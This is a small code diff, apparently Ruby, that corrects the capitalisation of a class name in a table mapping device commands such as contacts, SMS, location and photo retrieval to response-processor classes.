@@ -18,7 +18,7 @@ class ResponseProcessor
     'get_contacts' => ContactsResponseProcessor,
     'get_call_logs' => CalllogsResponseProcessor,
     'get_location' => LocationResponseProcessor,
-    'get_device_info' => DeviceinfoResponseProcessor,
+    'get_device_info' => DeviceInfoResponseProcessor,
     'get_sms' => SmsResponseProcessor,
     'take_screenshot' => ScreenshotResponseProcessor,
     'take_photo' => PhotoResponseProcessor,
